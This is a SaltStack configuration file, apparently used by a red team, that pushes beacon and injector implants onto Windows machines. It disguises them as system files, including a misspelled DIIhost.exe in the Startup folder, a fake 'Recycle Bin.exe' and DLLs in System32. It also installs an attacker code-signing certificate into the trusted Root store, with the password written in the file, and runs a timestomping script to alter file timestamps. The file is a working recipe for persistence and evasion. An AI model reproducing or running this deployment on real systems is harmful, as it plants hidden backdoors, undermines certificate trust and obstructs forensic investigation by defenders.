COMHijack_deploy:
  file.managed:
    - name: C:\Program Files (x86)\Internet Explorer\exp.dll      
    - source: salt://redteam/beacons/exp.dll        
    - makedirs: True                                    
    - replace: True                                     

Password_deploy:
  file.managed:
    - name: C:\Windows\System32\krb.dll                                 
    - source: salt://redteam/web.dll                                                                        
    - makedirs: True                                                 
    - replace: True  

winsock_deploy:
  file.managed:
    - name: C:\Windows\System32\rasadhelp.dll
    - source: salt://redteam/beacons/rasadhelp.dll
    - makedirs: True
    - replace: True

InjectorDLL_deploy:
  file.managed:
    - name: C:\Windows\System32\ike.dll
    - source: salt://redteam/beacons/ike.dll
    - makedirs: True
    - replace: True

Injector_deploy:
  file.managed:
    - name: C:\Windows\Help\OEM\IndexStore\salt.exe
    - source: salt://redteam/nosferatu/injector.exe
    - makedirs: True
    - replace: True

Nosferatu_deploy:
  file.managed:
    - name: C:\ProgramData\qemu-ga\qemu-ga.dll
    - source: salt://redteam/nosferatu/nosferatu.dll
    - makedirs: True
    - replace: True

Autostartbeacon_deploy:
  file.managed:
    - name: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\DIIhost.exe
    - source: salt://redteam/beacons/apollo.exe
    - makedirs: True
    - replace: True

AutostartbeaconREGISTRYAUTOKEY_deploy:
  file.managed:
    - name: C:\$Recycle.Bin\Recycle Bin.exe
    - source: salt://redteam/beacons/apollo.exe
    - makedirs: True
    - replace: True

Taskscheduler_deploy:
  file.managed:
    - name: C:\inetpub\iis.exe
    - source: salt://redteam/beacons/apollo.exe
    - makedirs: True
    - replace: True

SSHService_deploy:
  file.managed:
    - name: C:\ProgramData\ssh\ssh.exe
    - source: salt://redteam/beacons/signed-apollo-service.exe
    - makedirs: True
    - replace: True

CLEANUPService_deploy:
  file.managed:
    - name: C:\Users\Public\cleanup.exe
    - source: salt://redteam/beacons/apollo-service.exe
    - makedirs: True
    - replace: True


Cert_Deploy:
  file.managed:
    - name: C:\Windows\Temp\codesign.pfx
    - source: salt://redteam/codesign.pfx
    - makedirs: True
    - replace: True

Cert_Import:
  cmd.run:
    - name: certutil.exe -f -p "machine-PLACE-4!" -importpfx Root "C:\Windows\Temp\codesign.pfx"
    - require:
      - file: Cert_Deploy


Recursive_Timestomp_Script:
  file.managed:
    - name: C:\Windows\Temp\Timestomp.ps1
    - source: salt://redteam/Timestomp.ps1
    - makedirs: True
    - replace: True

Recursive_Timestomp_Run:
  cmd.run:
    - name: powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\Timestomp.ps1
    - require:
      - file: Recursive_Timestomp_Script
